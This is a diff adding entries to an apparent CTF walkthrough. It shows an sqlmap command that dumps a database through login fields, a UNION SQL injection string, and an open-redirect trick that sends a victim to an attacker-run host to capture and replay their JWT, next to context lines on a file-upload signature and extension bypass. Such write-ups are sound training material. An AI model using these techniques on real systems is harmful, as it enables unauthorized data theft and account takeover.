@@ -34,3 +34,17 @@ This step checks the file signature, force the PNG file signature ```89 50 4E 47
 ### Upload 104
 Same as upload 101 but change the name of the script to script.png.php3
 
+### SQL 101
+Kinda hard for a 101 track, but use sqlmap with this command:```sqlmap u "URL HERE" --data "password=admin&username=admin" -p "password,username" --method POST --current-db --dump --technique=BEUSTQ```
+
+### SQL 102
+Directly in the username field, enter the injection: ```' union SELECT '','',''--```
+
+### Open Redirect 101
+My team owns a small server on the CTF network, so we redirect the user there ```URL.ctf/?sub_url=http://shell.ctf```<br>
+Look at the logs on the server, we can see his JWT token.<br>
+Go to ```URL.ctf/?identity=(insert JWT)``` (reminder; the token is only valid for 20mins)
+
+### Serialize 101
+
+
